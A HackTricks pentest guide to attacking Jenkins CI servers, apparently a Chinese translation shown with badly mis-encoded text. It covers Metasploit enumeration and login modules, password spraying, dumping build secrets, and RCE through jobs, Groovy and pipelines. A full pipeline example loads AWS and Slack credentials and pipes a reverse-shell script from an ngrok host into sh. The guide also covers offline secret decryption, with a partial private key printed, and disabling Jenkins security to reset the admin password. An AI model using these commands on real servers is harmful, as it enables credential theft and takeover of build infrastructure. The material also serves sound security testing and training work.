# Jenkins å®‰å…¨æ€§

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

Jenkins æ˜¯ä¸€ä¸ªå·¥å…·ï¼Œå®ƒæä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•ï¼Œç”¨äºä¸ºå‡ ä¹**ä»»ä½•**ç»„åˆçš„**ç¼–ç¨‹è¯­è¨€**å’Œæºä»£ç ä»“åº“ä½¿ç”¨ç®¡é“å»ºç«‹**æŒç»­é›†æˆ**æˆ–**æŒç»­äº¤ä»˜**ï¼ˆCI/CDï¼‰ç¯å¢ƒã€‚æ­¤å¤–ï¼Œå®ƒè¿˜è‡ªåŠ¨åŒ–äº†å„ç§å¸¸è§„å¼€å‘ä»»åŠ¡ã€‚è™½ç„¶ Jenkins å¹¶æ²¡æœ‰æ¶ˆé™¤ä¸ºå„ä¸ªæ­¥éª¤**åˆ›å»ºè„šæœ¬çš„éœ€æ±‚**ï¼Œä½†å®ƒç¡®å®æä¾›äº†ä¸€ç§æ¯”æ‰‹åŠ¨è½»æ¾æ„å»ºçš„æ•´ä¸ªæ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²å·¥å…·åºåˆ—æ›´å¿«ã€æ›´ç¨³å¥çš„æ–¹å¼ã€‚


{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## æœªç»è®¤è¯çš„æšä¸¾

ä¸ºäº†æœç´¢åƒï¼ˆ_/people_ æˆ– _/asynchPeople_ï¼Œè¿™åˆ—å‡ºäº†å½“å‰ç”¨æˆ·ï¼‰è¿™æ ·çš„æœ‰è¶£ Jenkins é¡µé¢è€Œæ— éœ€è®¤è¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```
msf> use auxiliary/scanner/http/jenkins_enum
```
æ£€æŸ¥æ˜¯å¦å¯ä»¥åœ¨ä¸éœ€è¦è®¤è¯çš„æƒ…å†µä¸‹æ‰§è¡Œå‘½ä»¤ï¼š
```
msf> use auxiliary/scanner/http/jenkins_command
```
æ²¡æœ‰å‡­è¯ï¼Œä½ å¯ä»¥æŸ¥çœ‹ _**/asynchPeople/**_ è·¯å¾„æˆ– _**/securityRealm/user/admin/search/index?q=**_ æ¥æ‰¾åˆ°**ç”¨æˆ·å**ã€‚

ä½ å¯èƒ½èƒ½ä» _**/oops**_ æˆ– _**/error**_ è·¯å¾„è·å– Jenkins ç‰ˆæœ¬ã€‚

![](<../../.gitbook/assets/image (48).png>)

### å·²çŸ¥æ¼æ´

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ç™»å½•

åœ¨åŸºæœ¬ä¿¡æ¯ä¸­ï¼Œä½ å¯ä»¥æ£€æŸ¥**æ‰€æœ‰ç™»å½• Jenkins çš„æ–¹å¼**ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### æ³¨å†Œ

ä½ å°†èƒ½å¤Ÿæ‰¾åˆ°å…è®¸ä½ åˆ›å»ºä¸€ä¸ªè´¦æˆ·å¹¶ç™»å½•çš„ Jenkins å®ä¾‹ã€‚å°±è¿™ä¹ˆç®€å•ã€‚

### **SSO ç™»å½•**

å¦‚æœå­˜åœ¨**SSO** **åŠŸèƒ½**/**æ’ä»¶**ï¼Œé‚£ä¹ˆä½ åº”è¯¥å°è¯•ä½¿ç”¨æµ‹è¯•è´¦æˆ·ç™»å½•åº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªæµ‹è¯•çš„ **Github/Bitbucket è´¦æˆ·**ï¼‰ã€‚æŠ€å·§æ¥è‡ª[**è¿™é‡Œ**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)ã€‚

### æš´åŠ›ç ´è§£

**Jenkins** ç¼ºä¹**å¯†ç ç­–ç•¥**å’Œ**ç”¨æˆ·åæš´åŠ›ç ´è§£ç¼“è§£æªæ–½**ã€‚å¯¹ç”¨æˆ·è¿›è¡Œ**æš´åŠ›ç ´è§£**æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºå¯èƒ½ä½¿ç”¨äº†**å¼±å¯†ç **æˆ–**ç”¨æˆ·åä½œä¸ºå¯†ç **ï¼Œç”šè‡³æ˜¯**åè½¬çš„ç”¨æˆ·åä½œä¸ºå¯†ç **ã€‚
```
msf> use auxiliary/scanner/http/jenkins_login
```
### å¯†ç å–·æ¶‚

ä½¿ç”¨[è¿™ä¸ªPythonè„šæœ¬](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py)æˆ–[è¿™ä¸ªPowerShellè„šæœ¬](https://github.com/chryzsh/JenkinsPasswordSpray)ã€‚

### IPç™½åå•ç»•è¿‡

è®¸å¤šç»„ç»‡å°†**åŸºäºSaaSçš„æºä»£ç ç®¡ç†ï¼ˆSCMï¼‰ç³»ç»Ÿ**å¦‚GitHubæˆ–GitLabä¸**å†…éƒ¨è‡ªæ‰˜ç®¡CI**è§£å†³æ–¹æ¡ˆå¦‚Jenkinsæˆ–TeamCityç»“åˆä½¿ç”¨ã€‚è¿™ç§è®¾ç½®å…è®¸CIç³»ç»Ÿ**æ¥æ”¶æ¥è‡ªSaaSæºä»£ç æ§åˆ¶ä¾›åº”å•†çš„webhookäº‹ä»¶**ï¼Œä¸»è¦ç”¨äºè§¦å‘ç®¡é“ä½œä¸šã€‚

ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œç»„ç»‡ä¼š**ç™½åå•** **SCMå¹³å°çš„IPèŒƒå›´**ï¼Œå…è®¸å®ƒä»¬é€šè¿‡**webhooks**è®¿é—®**å†…éƒ¨CIç³»ç»Ÿ**ã€‚ç„¶è€Œï¼Œé‡è¦çš„æ˜¯è¦æ³¨æ„**ä»»ä½•äºº**éƒ½å¯ä»¥åœ¨GitHubæˆ–GitLabä¸Šåˆ›å»ºä¸€ä¸ª**è´¦æˆ·**å¹¶é…ç½®å®ƒæ¥**è§¦å‘webhook**ï¼Œå¯èƒ½å‘**å†…éƒ¨CIç³»ç»Ÿ**å‘é€è¯·æ±‚ã€‚

æ£€æŸ¥ï¼š
[shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## å†…éƒ¨Jenkinsæ»¥ç”¨

åœ¨è¿™äº›åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å‡è®¾ä½ æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„è´¦æˆ·æ¥è®¿é—®Jenkinsã€‚

{% hint style="warning" %}
æ ¹æ®åœ¨Jenkinsä¸­é…ç½®çš„**æˆæƒ**æœºåˆ¶å’Œå—æŸç”¨æˆ·çš„æƒé™ï¼Œä½ **å¯èƒ½èƒ½å¤Ÿä¹Ÿå¯èƒ½ä¸èƒ½æ‰§è¡Œä»¥ä¸‹æ”»å‡»ã€‚**
{% endhint %}

æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹åŸºç¡€ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### åˆ—å‡ºç”¨æˆ·

å¦‚æœä½ å·²ç»è®¿é—®äº†Jenkinsï¼Œä½ å¯ä»¥åœ¨[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)åˆ—å‡ºå…¶ä»–æ³¨å†Œç”¨æˆ·ã€‚

### è½¬å‚¨æ„å»ºä»¥æŸ¥æ‰¾æ˜æ–‡ç§˜å¯†

ä½¿ç”¨[è¿™ä¸ªè„šæœ¬](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)è½¬å‚¨æ„å»ºæ§åˆ¶å°è¾“å‡ºå’Œæ„å»ºç¯å¢ƒå˜é‡ï¼Œå¸Œæœ›èƒ½æ‰¾åˆ°æ˜æ–‡ç§˜å¯†ã€‚
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **çªƒå–SSHå‡­æ®**

å¦‚æœè¢«æ”»é™·çš„ç”¨æˆ·æœ‰**è¶³å¤Ÿçš„æƒé™åˆ›å»º/ä¿®æ”¹æ–°çš„JenkinsèŠ‚ç‚¹**ï¼Œå¹¶ä¸”å·²ç»å­˜å‚¨äº†SSHå‡­æ®ä»¥è®¿é—®å…¶ä»–èŠ‚ç‚¹ï¼Œä»–å¯ä»¥é€šè¿‡åˆ›å»º/ä¿®æ”¹èŠ‚ç‚¹å¹¶**è®¾ç½®ä¸€ä¸ªå°†è®°å½•å‡­æ®çš„ä¸»æœº**æ¥**çªƒå–è¿™äº›å‡­æ®**ï¼Œè€Œæ— éœ€éªŒè¯ä¸»æœºå¯†é’¥ï¼š

![](<../../.gitbook/assets/image (56).png>)

æ‚¨é€šå¸¸ä¼šåœ¨**å…¨å±€æä¾›è€…**ï¼ˆ`/credentials/`ï¼‰ä¸­æ‰¾åˆ°Jenkins sshå‡­æ®ï¼Œå› æ­¤æ‚¨ä¹Ÿå¯ä»¥åƒè½¬å‚¨ä»»ä½•å…¶ä»–ç§˜å¯†ä¸€æ ·è½¬å‚¨å®ƒä»¬ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è§[**è½¬å‚¨ç§˜å¯†éƒ¨åˆ†**](./#dumping-secrets)ã€‚

### **åœ¨Jenkinsä¸­æ‰§è¡ŒRCE**

åœ¨JenkinsæœåŠ¡å™¨ä¸Šè·å–**shell**ï¼Œç»™æ”»å‡»è€…æœºä¼šæ³„éœ²æ‰€æœ‰çš„**ç§˜å¯†**å’Œ**ç¯å¢ƒå˜é‡**ï¼Œå¹¶**åˆ©ç”¨åŒä¸€ç½‘ç»œä¸­çš„å…¶ä»–æœºå™¨**ï¼Œç”šè‡³**æ”¶é›†äº‘å‡­æ®**ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼ŒJenkinså°†**ä»¥SYSTEMèº«ä»½è¿è¡Œ**ã€‚å› æ­¤ï¼Œæ”»é™·å®ƒå°†ç»™æ”»å‡»è€…**SYSTEMæƒé™**ã€‚

### **åˆ›å»º/ä¿®æ”¹é¡¹ç›®æ‰§è¡ŒRCE**

åˆ›å»º/ä¿®æ”¹é¡¹ç›®æ˜¯è·å–JenkinsæœåŠ¡å™¨RCEçš„ä¸€ç§æ–¹å¼ï¼š

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **æ‰§è¡ŒGroovyè„šæœ¬æ‰§è¡ŒRCE**

æ‚¨è¿˜å¯ä»¥é€šè¿‡æ‰§è¡ŒGroovyè„šæœ¬è·å¾—RCEï¼Œè¿™å¯èƒ½æ¯”åˆ›å»ºæ–°é¡¹ç›®æ›´éšè”½ï¼š

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### åˆ›å»º/ä¿®æ”¹Pipelineæ‰§è¡ŒRCE

æ‚¨è¿˜å¯ä»¥é€šè¿‡**åˆ›å»º/ä¿®æ”¹pipeline**æ¥è·å–**RCE**ï¼š

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pipelineåˆ©ç”¨

è¦åˆ©ç”¨pipelinesï¼Œæ‚¨ä»ç„¶éœ€è¦è®¿é—®Jenkinsã€‚

### æ„å»ºPipelines

**Pipelines**ä¹Ÿå¯ä»¥ç”¨ä½œ**é¡¹ç›®ä¸­çš„æ„å»ºæœºåˆ¶**ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é…ç½®**å­˜å‚¨åœ¨ä»“åº“å†…çš„æ–‡ä»¶**ï¼Œå…¶ä¸­åŒ…å«pipelineè¯­æ³•ã€‚é»˜è®¤ä½¿ç”¨`/Jenkinsfile`ï¼š

![](<../../.gitbook/assets/image (14) (1) (1).png>)

ä¹Ÿå¯ä»¥**å°†pipelineé…ç½®æ–‡ä»¶å­˜å‚¨åœ¨å…¶ä»–åœ°æ–¹**ï¼ˆä¾‹å¦‚åœ¨å…¶ä»–ä»“åº“ä¸­ï¼‰ï¼Œç›®çš„æ˜¯**åˆ†ç¦»**ä»“åº“**è®¿é—®**å’Œpipelineè®¿é—®ã€‚

å¦‚æœæ”»å‡»è€…æœ‰**å¯¹è¯¥æ–‡ä»¶çš„å†™æƒé™**ï¼Œä»–å°†èƒ½å¤Ÿ**ä¿®æ”¹**å®ƒï¼Œå¹¶ä¸”**å¯èƒ½è§¦å‘**pipelineï¼Œç”šè‡³æ— éœ€è®¿é—®Jenkinsã€‚\
æ”»å‡»è€…å¯èƒ½éœ€è¦**ç»•è¿‡ä¸€äº›åˆ†æ”¯ä¿æŠ¤**ï¼ˆæ ¹æ®å¹³å°å’Œç”¨æˆ·æƒé™ï¼Œå®ƒä»¬å¯èƒ½è¢«ç»•è¿‡æˆ–ä¸è¢«ç»•è¿‡ï¼‰ã€‚

æ‰§è¡Œè‡ªå®šä¹‰pipelineçš„æœ€å¸¸è§è§¦å‘å™¨æ˜¯ï¼š

* **å‘ä¸»åˆ†æ”¯å‘èµ·Pull request**ï¼ˆæˆ–æ½œåœ¨åœ°å‘å…¶ä»–åˆ†æ”¯ï¼‰
* **å‘ä¸»åˆ†æ”¯æ¨é€**ï¼ˆæˆ–æ½œåœ¨åœ°å‘å…¶ä»–åˆ†æ”¯ï¼‰
* **æ›´æ–°ä¸»åˆ†æ”¯**å¹¶ç­‰å¾…å®ƒä»¥æŸç§æ–¹å¼æ‰§è¡Œ

{% hint style="info" %}
å¦‚æœæ‚¨æ˜¯**å¤–éƒ¨ç”¨æˆ·**ï¼Œæ‚¨ä¸åº”è¯¥æœŸæœ›èƒ½å¤Ÿå¯¹**å…¶ä»–ç”¨æˆ·/ç»„ç»‡**çš„ä»“åº“çš„**ä¸»åˆ†æ”¯åˆ›å»ºPR**å¹¶**è§¦å‘pipeline**...ä½†å¦‚æœé…ç½®**ä¸å½“**ï¼Œæ‚¨å¯èƒ½å®Œå…¨é€šè¿‡åˆ©ç”¨è¿™ä¸€ç‚¹**å±åŠå…¬å¸**ã€‚
{% endhint %}

### Pipeline RCE

åœ¨å‰é¢çš„RCEéƒ¨åˆ†å·²ç»æŒ‡å‡ºäº†ä¸€ç§[**ä¿®æ”¹pipelineè·å–RCE**](./#rce-creating-modifying-pipeline)çš„æŠ€æœ¯ã€‚

### æ£€æŸ¥ç¯å¢ƒå˜é‡

å¯ä»¥ä¸ºæ•´ä¸ªpipelineæˆ–ç‰¹å®šé˜¶æ®µå£°æ˜**æ˜æ–‡ç¯å¢ƒå˜é‡**ã€‚è¿™äº›ç¯å¢ƒå˜é‡**ä¸åº”åŒ…å«æ•æ„Ÿä¿¡æ¯**ï¼Œä½†æ”»å‡»è€…æ€»æ˜¯å¯ä»¥**æ£€æŸ¥æ‰€æœ‰pipeline**é…ç½®/Jenkinsfilesï¼š
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### å¯¼å‡ºç§˜å¯†

è¦äº†è§£Jenkinsé€šå¸¸å¦‚ä½•å¤„ç†ç§˜å¯†ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

å‡­æ®å¯ä»¥**é™å®šåœ¨å…¨å±€æä¾›è€…**ï¼ˆ`/credentials/`ï¼‰æˆ–**ç‰¹å®šé¡¹ç›®**ï¼ˆ`/job/<project-name>/configure`ï¼‰ã€‚å› æ­¤ï¼Œä¸ºäº†çªƒå–æ‰€æœ‰å‡­æ®ï¼Œä½ éœ€è¦**è‡³å°‘ä¾µå…¥åŒ…å«ç§˜å¯†çš„æ‰€æœ‰é¡¹ç›®**å¹¶æ‰§è¡Œè‡ªå®šä¹‰/æ¶æ„æµæ°´çº¿ã€‚

è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºäº†åœ¨æµæ°´çº¿çš„ç¯å¢ƒå˜é‡ä¸­è·å–**ç§˜å¯†**ï¼Œä½ éœ€è¦**çŸ¥é“ç§˜å¯†çš„åç§°å’Œç±»å‹**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ å°è¯•å°†**`usernamePassword`**ç±»å‹çš„**ç§˜å¯†**å½“ä½œ**`string`**ç±»å‹çš„**ç§˜å¯†**æ¥**åŠ è½½**ï¼Œä½ ä¼šå¾—åˆ°ä»¥ä¸‹**é”™è¯¯**ï¼š
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
```markdown
ä»¥ä¸‹æ˜¯åŠ è½½ä¸€äº›å¸¸è§ç§˜å¯†ç±»å‹çš„æ–¹æ³•ï¼š
```
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
åœ¨æœ¬é¡µæœ«å°¾ï¼Œæ‚¨å¯ä»¥**æ‰¾åˆ°æ‰€æœ‰å‡­è¯ç±»å‹**ï¼š[https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**ä¸€æ¬¡æ€§å¯¼å‡ºæ‰€æœ‰ç§˜å¯†**çš„æœ€ä½³æ–¹å¼æ˜¯é€šè¿‡**æ”»ç ´** **Jenkins** æœºå™¨ï¼ˆä¾‹å¦‚åœ¨**å†…ç½®èŠ‚ç‚¹**ä¸Šè¿è¡Œåå‘ shellï¼‰ï¼Œç„¶å**æ³„éœ²** **ä¸»å¯†é’¥**å’Œ**åŠ å¯†çš„ç§˜å¯†**ï¼Œå¹¶ç¦»çº¿è§£å¯†å®ƒä»¬ã€‚\
æ›´å¤šå…³äºå¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹çš„ä¿¡æ¯ï¼Œè¯·å‚è§[èŠ‚ç‚¹ä¸ä»£ç†éƒ¨åˆ†](./#nodes-and-agents)å’Œ[æ¸—é€åéƒ¨åˆ†](./#post-exploitation)ã€‚
{% endhint %}

### è§¦å‘å™¨

æ¥è‡ª[æ–‡æ¡£](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)ï¼š`triggers` æŒ‡ä»¤å®šä¹‰äº†**è‡ªåŠ¨é‡æ–°è§¦å‘ Pipeline çš„æ–¹å¼**ã€‚å¯¹äºä¸æºä»£ç ä»“åº“å¦‚ GitHub æˆ– BitBucket é›†æˆçš„ Pipelinesï¼Œå¯èƒ½ä¸éœ€è¦ `triggers`ï¼Œå› ä¸ºåŸºäº webhooks çš„é›†æˆå¾ˆå¯èƒ½å·²ç»å­˜åœ¨ã€‚ç›®å‰å¯ç”¨çš„è§¦å‘å™¨æœ‰ `cron`ã€`pollSCM` å’Œ `upstream`ã€‚

Cron ç¤ºä¾‹ï¼š
```bash
triggers { cron('H */4 * * 1-5') }
```
æŸ¥çœ‹**æ–‡æ¡£ä¸­çš„å…¶ä»–ç¤ºä¾‹**ã€‚

### èŠ‚ç‚¹ä¸ä»£ç†

ä¸€ä¸ª**Jenkinså®ä¾‹**å¯èƒ½ä¼šåœ¨**ä¸åŒçš„æœºå™¨ä¸Šè¿è¡Œä¸åŒçš„ä»£ç†**ã€‚ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œè®¿é—®ä¸åŒçš„æœºå™¨æ„å‘³ç€**ä¸åŒæ½œåœ¨çš„äº‘å‡­è¯**å¯ä»¥è¢«çªƒå–ï¼Œæˆ–è€…**ä¸åŒçš„ç½‘ç»œè®¿é—®**å¯èƒ½è¢«æ»¥ç”¨æ¥æ”»å‡»å…¶ä»–æœºå™¨ã€‚

æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹åŸºç¡€ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

ä½ å¯ä»¥åœ¨`/computer/`ä¸­æšä¸¾**é…ç½®çš„èŠ‚ç‚¹**ï¼Œä½ é€šå¸¸ä¼šæ‰¾åˆ°**`å†…ç½®èŠ‚ç‚¹`**ï¼ˆè¿è¡ŒJenkinsçš„èŠ‚ç‚¹ï¼‰ï¼Œå¯èƒ½è¿˜æœ‰æ›´å¤šï¼š

![](<../../.gitbook/assets/image (25).png>)

**æ”»ç ´å†…ç½®èŠ‚ç‚¹å°¤å…¶æœ‰è¶£**ï¼Œå› ä¸ºå®ƒåŒ…å«æ•æ„Ÿçš„Jenkinsä¿¡æ¯ã€‚

å¦‚æœä½ æƒ³åœ¨**å†…ç½®çš„JenkinsèŠ‚ç‚¹**ä¸Š**è¿è¡Œ** **æµæ°´çº¿**ï¼Œä½ å¯ä»¥åœ¨æµæ°´çº¿ä¸­æŒ‡å®šä»¥ä¸‹é…ç½®ï¼š
```bash
pipeline {
agent {label 'built-in'}
```
### å®Œæ•´ç¤ºä¾‹

åœ¨ç‰¹å®šä»£ç†ä¸­çš„ Pipelineï¼Œå¸¦æœ‰ cron è§¦å‘å™¨ï¼Œå…·æœ‰ pipeline å’Œ stage ç¯å¢ƒå˜é‡ï¼Œåœ¨æ­¥éª¤ä¸­åŠ è½½ 2 ä¸ªå˜é‡å¹¶å‘é€åå‘ shellï¼š
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## åæ¸—é€

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins å¯†é’¥

å¦‚æœæ‚¨æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œå¯ä»¥é€šè¿‡è®¿é—® `/credentials/` æ¥åˆ—å‡ºå¯†é’¥ã€‚è¯·æ³¨æ„ï¼Œè¿™åªä¼šåˆ—å‡º `credentials.xml` æ–‡ä»¶ä¸­çš„å¯†é’¥ï¼Œä½†**æ„å»ºé…ç½®æ–‡ä»¶**ä¸­å¯èƒ½è¿˜æœ‰**æ›´å¤šçš„å‡­è¯**ã€‚

å¦‚æœæ‚¨èƒ½å¤Ÿ**æŸ¥çœ‹æ¯ä¸ªé¡¹ç›®çš„é…ç½®**ï¼Œæ‚¨è¿˜å¯ä»¥åœ¨é‚£é‡Œçœ‹åˆ°æ­£åœ¨ä½¿ç”¨çš„**å‡­è¯ï¼ˆå¯†é’¥ï¼‰çš„åç§°**ï¼Œä»¥åŠ**é¡¹ç›®çš„å…¶ä»–å‡­è¯**ã€‚

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

#### é€šè¿‡ Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### ä»ç£ç›˜

éœ€è¦ä»¥ä¸‹æ–‡ä»¶æ¥**è§£å¯† Jenkins å¯†é’¥**ï¼š

* secrets/master.key
* secrets/hudson.util.Secret

è¿™äº›**å¯†é’¥é€šå¸¸å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°**ï¼š

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

ä»¥ä¸‹æ˜¯ä¸€ä¸ªç”¨äºæŸ¥æ‰¾å®ƒä»¬çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### ç¦»çº¿è§£å¯†Jenkinsç§˜å¯†

å¦‚æœæ‚¨å·²ç»è½¬å‚¨äº†**è§£å¯†ç§˜å¯†æ‰€éœ€çš„å¯†ç **ï¼Œä½¿ç”¨[**è¿™ä¸ªè„šæœ¬**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) **æ¥è§£å¯†è¿™äº›ç§˜å¯†**ã€‚
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### è§£å¯† Groovy ä¸­çš„ Jenkins å¯†ç 
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### åˆ›å»ºæ–°çš„ç®¡ç†å‘˜ç”¨æˆ·

1. è®¿é—®Jenkinsçš„config.xmlæ–‡ä»¶ï¼Œè·¯å¾„ä¸º`/var/lib/jenkins/config.xml`æˆ–`C:\Program Files (x86)\Jenkis\`
2. æœç´¢`<useSecurity>true</useSecurity>`å¹¶å°†`true`æ”¹ä¸º`false`ã€‚
3. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
4. **é‡å¯** **Jenkins**æœåŠ¡å™¨ï¼š`service jenkins restart`
5. å†æ¬¡è®¿é—®Jenkinsé—¨æˆ·ï¼Œè¿™æ¬¡**Jenkinsä¸ä¼šè¦æ±‚ä»»ä½•å‡­è¯**ã€‚ä½ å¯ä»¥å¯¼èˆªåˆ°â€œ**ç®¡ç†Jenkins**â€é‡æ–°è®¾ç½®**ç®¡ç†å‘˜å¯†ç **ã€‚
6. é€šè¿‡å°†è®¾ç½®æ”¹å›`<useSecurity>true</useSecurity>`**å†æ¬¡å¯ç”¨** **å®‰å…¨æ€§**ï¼Œå¹¶**é‡å¯Jenkins**ã€‚

## å‚è€ƒèµ„æ–™

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
